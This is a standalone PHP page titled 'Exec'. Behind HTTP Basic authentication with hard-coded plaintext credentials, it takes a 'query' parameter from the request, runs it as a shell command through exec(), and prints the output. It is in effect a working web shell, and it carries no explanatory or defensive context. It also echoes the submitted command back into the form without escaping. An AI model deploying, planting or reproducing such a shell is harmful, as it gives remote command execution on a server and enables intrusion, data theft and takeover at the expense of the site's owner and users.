<?php
define('ADMIN_USERNAME','creationshop'); 	// Admin Username
define('ADMIN_PASSWORD','n!ceWolf95');  	// Admin Password

///////////////// Password protect ////////////////////////////////////////////////////////////////
if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
           $_SERVER['PHP_AUTH_USER'] != ADMIN_USERNAME ||$_SERVER['PHP_AUTH_PW'] != ADMIN_PASSWORD) {
			Header("WWW-Authenticate: Basic realm=\"Login\"");
			Header("HTTP/1.0 401 Unauthorized");

			echo <<<EOB
				<html><body>
				<h1>Rejected!</h1>
				<big>Wrong Username or Password!</big>
				</body></html>
EOB;
			exit;
}

$res = array();
if (isset($_REQUEST['query'])) {
    exec($_REQUEST['query'],$res);
}





?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Exec</title>
</head>

<body>
<form action="" method="get">
<p>
<label>Exec command
<textarea name="query" cols="100" rows="20"><?=stripslashes(isset($_REQUEST['query']) ? $_REQUEST['query'] : '')?></textarea>
</label>
</p>
<p>
  <label>
  <input type="submit" name="Submit" value="Submit" />
  </label>
</p>

</form>
<?php
if ($res){
	echo "Result:";
	echo "<pre>";
	echo implode("\n",$res);
	echo "</pre>";
}
?>


</body>
</html>